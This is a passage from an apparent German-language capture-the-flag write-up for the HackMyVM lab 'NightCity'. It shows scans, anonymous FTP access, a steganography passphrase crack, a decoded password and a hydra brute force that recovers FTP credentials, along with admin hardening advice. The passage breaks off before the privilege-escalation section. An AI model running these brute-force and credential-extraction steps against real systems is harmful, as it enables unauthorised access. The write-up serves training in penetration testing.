@@ -1,0 +1,1021 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NightCity - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>NightCity - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi / Editor</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">msfconsole (metasploit)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">Bildbearbeitung (implied)</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, FTP)</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (Stego, Credentials)</a></li>
+                <li><a href="#initial-access">Initial Access (batman)</a></li>
+                <li><a href="#privesc-joker">Privilege Escalation (batman -> joker)</a></li>
+                <li><a href="#poc">Proof of Concept (joker -> Flag Access)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Test beginnt mit `arp-scan -l` zur Identifizierung von Zielen im lokalen Netzwerksegment. Anschließend wird die `/etc/hosts`-Datei bearbeitet, um der gefundenen IP einen Hostnamen zuzuweisen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Host `192.168.2.110` (MAC `08:00:27:75:0b:34` -> VirtualBox) wird gefunden. Der IP wird in der lokalen `/etc/hosts`-Datei der Name `nightcity.vuln` zugeordnet. Dies erleichtert die weitere Arbeit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie Port-Scans und Web-Scans gegen `192.168.2.110` bzw. `nightcity.vuln` durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standard-Netzwerksicherheitsmaßnahmen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.137
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.2.2	00:50:56:f4:7d:5f	VMware, Inc.
+192.168.2.110	08:00:27:75:0b:34	PCS Systemtechnik GmbH
+192.168.2.254	00:50:56:f8:46:8c	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.858 seconds (137.78 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+192.168.2.110    nightcity.vuln # Eintrag hinzugefügt/aktualisiert
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ein `nikto`-Scan wird gegen die IP-Adresse `192.168.2.110` ausgeführt, um den Webserver auf bekannte Schwachstellen und interessante Konfigurationen zu überprüfen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Nikto identifiziert den Webserver als Apache/2.4.29 (Ubuntu) und meldet:
+                 *   Fehlende Security Header (`X-Frame-Options`, `X-Content-Type-Options`).
+                 *   Mögliches internes IP-Leak (`127.0.1.1`) im Location-Header bei bestimmten Anfragen (CVE-2000-0649).
+                 *   Mögliches Inode-Leak über ETags (CVE-2003-1418).
+                 *   Veraltete Apache-Version (aktuell > 2.4.54).
+                 *   Directory Indexing in `/secret/` und `/images/`. `/secret/` wird als potenziell interessant markiert.
+                 *   Standard-Apache-Datei `/icons/README` gefunden.
+                 Die wichtigsten Funde sind die veraltete Apache-Version und das `/secret/`-Verzeichnis mit Directory Indexing.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/secret/`-Verzeichnis. Prüfen Sie die Apache-Version 2.4.29 auf bekannte Exploits. Ignorieren Sie die fehlenden Header und ETag-Leaks vorerst, da sie weniger wahrscheinlich zu einem direkten Einstieg führen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Aktualisieren Sie Apache dringend. Implementieren Sie fehlende Security Header. Deaktivieren Sie Directory Indexing, insbesondere für potenziell sensible Verzeichnisse wie `/secret/`. Entfernen Sie Standarddateien wie `/icons/README`. Konfigurieren Sie den Server so, dass interne IPs nicht geleakt werden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.110</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.110
++ Target Hostname:    192.168.2.110
++ Target Port:        80
++ Start Time:         2023-06-19 22:46:06 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
++ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ /: Server may leak inodes via ETags, header found with file /, inode: 20d7, size: 5e10515f83094, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
++ /secret/: Directory indexing found.
++ /secret/: This might be interesting.
++ /images/: Directory indexing found.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2023-06-19 22:46:18 (GMT2) (12 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln. Die Optionen `-sS -sC -Pn -AO -p-` werden verwendet. `-Pn` überspringt die Host-Discovery (Ping-Scan), `-AO` ist eine ältere Option für OS-Erkennung (redundant mit `-A`, das oft implizit `-sC`, `-sV`, `-O`, `--traceroute` enthält; hier wird `-A` nicht verwendet, nur `-AO` und `-sC`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert drei offene Ports:
+                *   **Port 21/tcp:** FTP, vsftpd (Version 2.0.8 oder neuer, `ftp-syst` meldet genauer `vsFTPd 3.0.3`). **Kritisch:** Anonymer Login ist erlaubt (`ftp-anon: Anonymous FTP login allowed`). Das Verzeichnis `reminder` im FTP-Root ist für den anonymen Benutzer beschreibbar (`drwxrwxrwx` und `[NSE: writeable]`).
+                *   **Port 22/tcp:** SSH, OpenSSH 7.6p1 (Ubuntu). Veraltet.
+                *   **Port 80/tcp:** HTTP, Apache httpd 2.4.29 (Ubuntu). Veraltet.
+                Die OS-Erkennung bestätigt Linux und VirtualBox. Der `grep open`-Befehl filtert die Ausgabe nur auf die offenen Ports.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Der anonyme FTP-Zugang mit Schreibrechten ist der wahrscheinlichste Einstiegspunkt. Untersuchen Sie das FTP-Verzeichnis `/reminder` sofort. Laden Sie Dateien herunter und versuchen Sie, Dateien hochzuladen (z.B. eine Webshell oder ein Skript). Überprüfen Sie die vsftpd-Version 3.0.3 auf bekannte Schwachstellen (obwohl der bekannte Backdoor in 2.3.4 war). Die veralteten SSH- und Apache-Versionen sollten auf bekannte Exploits geprüft werden.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Deaktivieren Sie den anonymen FTP-Zugang sofort oder entfernen Sie zumindest die Schreibrechte für den anonymen Benutzer im Verzeichnis `/reminder`. Aktualisieren Sie vsftpd, OpenSSH und Apache dringend auf die neuesten stabilen Versionen.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -Pn -AO 192.168.2.110 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 22:45 CEST
+Nmap scan report for NightCity (192.168.2.110)
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0            4096 Jun 09  2022 reminder [NSE: writeable]
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.2.137
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ce:ac:1c:04:d6:f6:64:d6:d9:9d:88:c9:0d:66:a9:45 (RSA)
+|   256 4f:f1:7b:69:5c:47:b2:91:b8:d2:2f:82:73:b7:fc:03 (ECDSA)
+|_  256 65:6b:3b:8c:89:81:4d:f3:98:98:5a:ed:57:cf:58:c9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: NightCity Web Server
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 08:00:27:75:0B:34 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms NightCity (192.168.2.110)
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.34 seconds
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -Pn -AO 192.168.2.110 -p- | grep open</span></div>
+                      <pre>
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+                      </pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (Web, FTP)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver eingesetzt. Eine sehr umfangreiche Liste an Endungen wird getestet, und nur Fehler 403/404 werden ignoriert (`-b '403,404'`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster findet die Standard-Webseiten (`index.html`, `contact.html` etc.), Verzeichnisse wie `/images`, `/js` und bestätigt erneut `/robots.txt` sowie das von Nikto gefundene Verzeichnis `/secret`. Es werden keine neuen, versteckten Dateien oder Skripte gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/robots.txt` und `/secret/`. Da der anonyme FTP-Zugriff vielversprechender aussieht, priorisieren Sie diesen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Bereinigen Sie das Web-Root von unnötigen Dateien/Verzeichnissen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.110 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,yml -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.110
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              ... (alle angegebenen) ...
+[+] Expanded:                true
+[+] No Error:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.110/index.html           (Status: 200) [Size: 8407]
+http://192.168.2.110/images               (Status: 301) [Size: 315] [--> http://192.168.2.110/images/]
+http://192.168.2.110/contact.html         (Status: 200) [Size: 6349]
+http://192.168.2.110/about.html           (Status: 200) [Size: 7744]
+http://192.168.2.110/gallery.html         (Status: 200) [Size: 8768]
+http://192.168.2.110/js                   (Status: 301) [Size: 311] [--> http://192.168.2.110/js/]
+http://192.168.2.110/robots.txt           (Status: 200) [Size: 136]
+http://192.168.2.110/secret               (Status: 301) [Size: 315] [--> http://192.168.2.110/secret/]
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine Verbindung zum FTP-Server wird über den `ftp`-Client hergestellt. Der Login erfolgt als `anonymous` mit einem beliebigen Passwort (hier leer gelassen). Die Verzeichnisse werden aufgelistet, in das `reminder`-Verzeichnis gewechselt und die Datei `reminder.txt` heruntergeladen. Es wird erfolglos versucht, eine Datei (`hash`) hochzuladen und in das `/home`-Verzeichnis zu wechseln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt den anonymen FTP-Zugriff und das Vorhandensein des Verzeichnisses `/reminder`. Die Datei `reminder.txt` wird erfolgreich heruntergeladen. Der Upload-Versuch scheitert mit "Permission denied", obwohl Nmap Schreibrechte anzeigte. Dies könnte an spezifischen vsftpd-Einstellungen (`write_enable=YES` global, aber vielleicht spezifische `anon_upload_enable=NO` oder Dateisystemberechtigungen auf einer höheren Ebene) liegen. Der Zugriff auf `/home` ist für den anonymen Benutzer ebenfalls gesperrt.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der heruntergeladenen `reminder.txt`. Untersuchen Sie die anderen Verzeichnisse, die für den anonymen Benutzer zugänglich sind (hier nur `.` und `..`). Da der Upload nicht funktioniert, konzentrieren Sie sich auf das Sammeln von Informationen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff oder stellen Sie sicher, dass die Berechtigungen extrem restriktiv sind (kein Schreibzugriff, kein Zugriff auf sensible Bereiche). Überprüfen Sie die vsftpd-Konfiguration (`/etc/vsftpd.conf`).
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.110</span></div>
+                     <pre>
+Connected to 192.168.2.110.
+220 Welcome to the NightCity Server!!
+Name (192.168.2.110:cyber): <span class="command">anonymous</span>
+331 Please specify the password.
+Password: <span class="password">(Enter)</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||29970|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Jun 09  2022 .
+drwxr-xr-x    3 0        0            4096 Jun 09  2022 ..
+drwxrwxrwx    2 0        0            4096 Jun 09  2022 reminder
+226 Directory send OK.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">cd reminder</span></div>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||6546|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jun 09  2022 .
+drwxr-xr-x    3 0        0            4096 Jun 09  2022 ..
+-rwxr-xr-x    1 0        0              33 Jun 09  2022 reminder.txt
+226 Directory send OK.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">get reminder.txt</span></div>
+                     <pre>
+local: reminder.txt remote: reminder.txt
+229 Entering Extended Passive Mode (|||41034|)
+150 Opening BINARY mode data connection for reminder.txt (33 bytes).
+100% |*************************************************|    33       137.71 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (73.40 KiB/s)
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">put hash</span></div>
+                     <pre>
+local: hash remote: hash
+229 Entering Extended Passive Mode (|||21851|)
+550 Permission denied.
+                     </pre>
+                      <div class="prompt ftp-prompt">ftp> <span class="command">cd /home</span></div>
+                      <pre>550 Failed to change directory.</pre>
+                      <div class="prompt ftp-prompt">ftp> <span class="command">quit</span></div>
+                      <pre>221 Goodbye.</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der vom FTP-Server heruntergeladenen Datei `reminder.txt` wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Nachricht "Local user is in the coordinates" ist ein Hinweis, der im Moment noch unklar ist. Er könnte sich auf Benutzernamen oder Passwörter beziehen, die an anderer Stelle gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalten Sie diesen Hinweis im Gedächtnis. Suchen Sie weiter nach Informationen, insbesondere im `/secret`-Verzeichnis auf dem Webserver und in `/robots.txt`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat reminder.txt</span></div>
+                     <pre>Local user is in the coordinates</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mittels `curl` wird das Verzeichnis `/secret/` auf dem Webserver abgerufen, das laut `nikto` und `gobuster` existiert und Directory Indexing aktiviert hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Verzeichnis enthält drei Bilddateien: `most-wanted.jpg`, `some-light.jpg`, `veryImportant.jpg`. Diese Dateinamen sind verdächtig und deuten auf mögliche versteckte Informationen hin.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Laden Sie alle drei Bilder herunter (`wget` oder `curl`). Untersuchen Sie sie auf Metadaten (`exiftool`) und Steganographie (`steghide`, `stegseek`, `zsteg`, `binwalk`). Beginnen Sie mit `most-wanted.jpg` und `veryImportant.jpg` aufgrund der Namen. Untersuchen Sie `some-light.jpg` auch auf visuelle Hinweise, die durch Aufhellen des Bildes sichtbar werden könnten.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing. Speichern Sie keine potenziell sensiblen oder hinweisgebenden Dateien in öffentlich zugänglichen Webverzeichnissen.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.110/secret/</span></div>
+                     <pre>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /secret</title>
+ </head>
+ <body>
+<h1>Index of /secret</h1>
+<table><tr><th>Name</th><th>Last modified</th><th>Size</th><th>Description</th></tr><tr><th colspan="4"><hr></th></tr>
+<tr><td><a href="../">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td><a href="most-wanted.jpg">most-wanted.jpg</a></td><td align="right">09-Jun-2022 10:05  </td><td align="right"> 77K</td><td>&nbsp;</td></tr>
+<tr><td><a href="some-light.jpg">some-light.jpg</a></td><td align="right">09-Jun-2022 10:05  </td><td align="right"> 17K</td><td>&nbsp;</td></tr>
+<tr><td><a href="veryImportant.jpg">veryImportant.jpg</a></td><td align="right">09-Jun-2022 10:05  </td><td align="right"> 69K</td><td>&nbsp;</td></tr>
+<tr><th colspan="4"><hr></th></tr>
+</table>
+<address>Apache/2.4.29 (Ubuntu) Server at 192.168.2.110 Port 80</address>
+</body></html>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt von `http://192.168.2.110/robots.txt` wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei enthält keine `Disallow`-Einträge, aber einen klaren Hinweis: "To continue, you need a workmate. Our lastest news is that Robin is close to NightCity. Try to find him, Robin has the key!!". Dies deutet auf einen Benutzer namens `robin` hin, der einen "Schlüssel" (Passwort oder SSH-Key) hat.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Fügen Sie `robin` zur Liste potenzieller Benutzernamen hinzu. Versuchen Sie, Passwörter für `robin` zu brute-forcen oder suchen Sie nach einem SSH-Schlüssel, der `robin` gehören könnte. Kombinieren Sie dies mit den Hinweisen aus `reminder.txt`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Verwenden Sie `robots.txt` nur für seinen eigentlichen Zweck (Anweisungen für Suchmaschinen). Hinterlassen Sie keine Hinweise oder Rätsel für Angreifer.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Inhalt von http://192.168.2.110/robots.txt
+
+#Good Job
+
+To continue, you need a workmate. Our lastest news is that Robin is close to
+NightCity. Try to find him, Robin has the key!!
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (Stego, Credentials)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Das Bild `most-wanted.jpg` (aus `/secret/` heruntergeladen) wird mit `stegseek` und der `rockyou.txt`-Wortliste auf versteckte Steghide-Daten untersucht.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> `stegseek` ist erfolgreich! Es findet die Passphrase `<span class="password">japon</span>` und extrahiert eine Datei namens `pass.txt` in `most-wanted.jpg.out`.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der extrahierten Datei `most-wanted.jpg.out`.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek most-wanted.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "<span class="password">japon</span>"
+[i] Original filename: "pass.txt".
+[i] Extracting to "most-wanted.jpg.out".
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der extrahierten Datei `most-wanted.jpg.out` wird angezeigt und mittels `base64 -d` dekodiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei enthält Base64-kodierten Text. Nach der Dekodierung wird das Passwort `<span class="password">ThisIsTheRealPassw0rd!</span>` enthüllt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dieses Passwort ist sehr wahrscheinlich der "Schlüssel", der in `robots.txt` erwähnt wurde. Da `robots.txt` auf `robin` hindeutete und das Thema der Maschine/Bilder oft auf Batman anspielt, versuchen Sie dieses Passwort für die Benutzer `robin` und `batman` auf den Diensten FTP und SSH.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat most-wanted.jpg.out | base64 -d</span></div>
+                     <pre><span class="password">ThisIsTheRealPassw0rd!</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den FTP-Dienst (Port 21) für den Benutzer `batman` durchzuführen. Als Passwortliste wird `rockyou.txt` angegeben, aber es ist wahrscheinlich, dass das zuvor gefundene Passwort `<span class="password">ThisIsTheRealPassw0rd!</span>` gezielt (oder am Anfang der Liste) getestet wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Hydra ist erfolgreich! Es bestätigt, dass die Kombination `batman`:`ThisIsTheRealPassw0rd!` für den FTP-Login gültig ist.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nachdem die FTP-Zugangsdaten bestätigt sind, loggen Sie sich als `batman` via FTP ein, um zu sehen, ob dieser Benutzer mehr Rechte oder Zugriff auf andere Verzeichnisse (wie `/home`) hat als der anonyme Benutzer. Testen Sie diese Zugangsdaten auch für SSH.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Das Passwort für `batman` ist kompromittiert und muss geändert werden. Die zugrundeliegende Schwachstelle (Steganographie) sollte adressiert werden.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l batman -P /usr/share/wordlists/rockyou.txt ftp://nightcity.vuln:21 -t 64</span></div>
+                     <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-19 23:09:39
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344410 login tries (l:1/p:14344410), ~224132 tries per task
+[DATA] attacking ftp://nightcity.vuln:21/
+[21][ftp] host: nightcity.vuln   login: batman   password: <span class="password">ThisIsTheRealPassw0rd!</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-19 23:10:23
+                     </pre>
+                 </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach Bestätigung der FTP-Zugangsdaten wird erneut eine FTP-Verbindung aufgebaut, diesmal als Benutzer `batman`. Es wird versucht, ins `/home`-Verzeichnis zu wechseln und dessen Inhalt aufzulisten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login als `batman` ist erfolgreich. Im Gegensatz zum anonymen Benutzer kann `batman` in das `/home`-Verzeichnis wechseln. Dort werden drei Home-Verzeichnisse gefunden: `administrator`, `anonymous` und `batman`. Dies gibt einen weiteren potenziellen Benutzernamen (`administrator`).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie nun den SSH-Login als `batman` mit demselben Passwort. Dies bietet normalerweise eine stabilere und mächtigere Shell als FTP. Fügen Sie `administrator` zur Liste der potenziellen Benutzernamen hinzu.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Erneuter FTP Login, diesmal als batman -->
